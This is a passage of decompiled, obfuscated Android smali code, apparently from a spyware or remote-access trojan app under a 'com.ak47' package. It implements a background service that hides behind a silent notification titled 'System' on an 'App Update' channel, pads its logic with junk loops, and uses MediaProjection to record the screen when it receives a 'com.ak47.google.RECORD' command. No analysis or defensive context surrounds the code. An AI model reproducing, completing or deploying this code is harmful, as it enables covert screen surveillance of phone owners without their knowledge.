    invoke-direct {v5, v6, v0, v7}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const-string v6, "App Update"

    invoke-virtual {v5, v6}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    invoke-virtual {v5, v3}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    invoke-virtual {v5, v2, v2}, Landroid/app/NotificationChannel;->setSound(Landroid/net/Uri;Landroid/media/AudioAttributes;)V

    invoke-virtual {v4, v5}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_4

    :cond_1
    const/16 v4, 0xe23

    :try_start_2
    invoke-static {v1, v4}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->e(Landroid/content/Context;I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_4

    :catch_0
    :try_start_3
    sget-object v4, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_0
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_2

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_0

    :cond_2
    :goto_1
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_3

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_1

    :cond_3
    :goto_2
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_4

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_2

    :cond_4
    :goto_3
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_5

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_3

    :catch_1
    :cond_5
    :goto_4
    :try_start_4
    invoke-static {v0, v1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->D(Ljava/lang/String;Landroid/content/Context;)Landroid/content/Intent;

    move-result-object v4

    const v5, 0x70008000

    invoke-virtual {v4, v5}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    const/high16 v5, 0xc000000

    invoke-static {v1, v3, v4, v5}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    new-instance v5, Landroidx/core/app/c$b;

    invoke-direct {v5, v1, v0}, Landroidx/core/app/c$b;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const v0, 0x106000d

    invoke-virtual {v5, v0}, Landroidx/core/app/c$b;->n(I)Landroidx/core/app/c$b;

    const-string v0, "System"

    invoke-virtual {v5, v0}, Landroidx/core/app/c$b;->h(Ljava/lang/CharSequence;)Landroidx/core/app/c$b;

    const-string v0, "System"

    invoke-virtual {v5, v0}, Landroidx/core/app/c$b;->g(Ljava/lang/CharSequence;)Landroidx/core/app/c$b;

    invoke-virtual {v5, v3}, Landroidx/core/app/c$b;->m(I)Landroidx/core/app/c$b;

    const-string v0, "call"

    invoke-virtual {v5, v0}, Landroidx/core/app/c$b;->e(Ljava/lang/String;)Landroidx/core/app/c$b;

    invoke-virtual {v5, v2}, Landroidx/core/app/c$b;->o(Landroid/net/Uri;)Landroidx/core/app/c$b;

    const/4 v0, -0x1

    invoke-virtual {v5, v0}, Landroidx/core/app/c$b;->i(I)Landroidx/core/app/c$b;

    const/4 v0, 0x1

    invoke-virtual {v5, v0}, Landroidx/core/app/c$b;->l(Z)Landroidx/core/app/c$b;

    invoke-virtual {v5, v3}, Landroidx/core/app/c$b;->d(Z)Landroidx/core/app/c$b;

    invoke-virtual {v5, v4}, Landroidx/core/app/c$b;->f(Landroid/app/PendingIntent;)Landroidx/core/app/c$b;

    invoke-virtual {v5, v4, v0}, Landroidx/core/app/c$b;->k(Landroid/app/PendingIntent;Z)Landroidx/core/app/c$b;

    invoke-static {v1}, Landroidx/core/app/f;->a(Landroid/content/Context;)Landroidx/core/app/f;

    invoke-virtual {v5}, Landroidx/core/app/c$b;->a()Landroid/app/Notification;

    move-result-object v0

    iput-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->h:Landroid/app/Notification;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_9

    :catch_2
    :try_start_5
    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_5
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_6

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_5

    :cond_6
    :goto_6
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_7

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_6

    :cond_7
    :goto_7
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_8

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_7

    :cond_8
    :goto_8
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_9

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    goto :goto_8

    :catch_3
    nop

    :cond_9
    :goto_9
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1d

    if-lt v0, v1, :cond_a

    iget v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->i:I

    iget-object v1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->h:Landroid/app/Notification;

    const/16 v2, 0x20

    invoke-virtual {p0, v0, v1, v2}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;I)V

    goto :goto_a

    :cond_a
    iget v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->i:I

    iget-object v1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->h:Landroid/app/Notification;

    invoke-virtual {p0, v0, v1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    :goto_a
    :try_start_6
    const-string v0, "media_projection"

    invoke-virtual {p0, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    iput-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->c:Landroid/media/projection/MediaProjectionManager;

    const-string v0, "window"

    invoke-virtual {p0, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->d:Landroid/view/WindowManager;

    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->a:Landroid/os/HandlerThread;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    new-instance v0, Landroid/os/Handler;

    iget-object v1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->a:Landroid/os/HandlerThread;

    invoke-virtual {v1}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->b:Landroid/os/Handler;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    :catch_4
    return-void
.end method

.method public onDestroy()V
    .locals 0

    invoke-static {}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->k()V

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 3

    :try_start_0
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    const/high16 p3, 0x10000000

    const/4 v0, 0x1

    const-string v1, "com.ak47.google.RECORD"

    if-nez p2, :cond_5

    :try_start_1
    const-string p2, "resultCode"

    const/16 v2, 0x539

    invoke-virtual {p1, p2, v2}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    iput p2, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->f:I

    const-string p2, "resultIntent"

    invoke-virtual {p1, p2}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object p2

    check-cast p2, Landroid/content/Intent;

    iput-object p2, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->g:Landroid/content/Intent;

    const-string p2, "Q"

    const/16 v2, 0xa

    invoke-virtual {p1, p2, v2}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    sput p2, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->o:I

    const-string p2, "F"

    const/4 v2, 0x5

    invoke-virtual {p1, p2, v2}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    sput p2, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->p:I

    const-string p2, "P"

    invoke-virtual {p1, p2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->q:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_4

    :catch_0
    :try_start_2
    sget-object p1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_0
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_0

    sget-object p1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_0

    :cond_0
    :goto_1
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_1

    sget-object p1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_1

    :cond_1
    :goto_2
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_2

    sget-object p1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_2

    :cond_2
    :goto_3
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_3

    sget-object p1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_3

    :cond_3
    :goto_4
    new-instance p1, Landroid/content/Intent;

    const-class p2, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;

    invoke-direct {p1, p0, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p1, p3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    sget p2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 p3, 0x1a

    if-lt p2, p3, :cond_4

    invoke-virtual {p0, p1}, Landroid/app/Service;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto/16 :goto_9

    :cond_4
    invoke-virtual {p0, p1}, Landroid/app/Service;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_9

    :cond_5
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_7

    iget-object p1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->g:Landroid/content/Intent;

    if-eqz p1, :cond_6

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->a(Landroid/content/Context;)V

    goto :goto_9

    :cond_6
    new-instance p1, Landroid/content/Intent;

    const-class p2, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72_SCA;

    invoke-direct {p1, p0, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, p3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1}, Landroid/app/Service;->startActivity(Landroid/content/Intent;)V

    goto :goto_9

    :cond_7
    const-string p2, "com.ak47.google.SHUTDOWN"

    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    if-eqz p1, :cond_b

    const/4 p1, 0x0

    :try_start_3
    sput-boolean p1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->r:Z

    invoke-static {}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->k()V

    invoke-virtual {p0, v0}, Landroid/app/Service;->stopForeground(Z)V

    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_9

    :catch_1
    :try_start_4
    sget-object p1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_5
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_8

    sget-object p1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_5

    :cond_8
    :goto_6
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_9

    sget-object p1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_6

    :cond_9
    :goto_7
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_a

    sget-object p1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_7

    :cond_a
    :goto_8
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_b

    sget-object p1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_8

    :cond_b
    :goto_9
    return v0

    :catch_2
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    const/4 p1, 0x2

    return p1
.end method
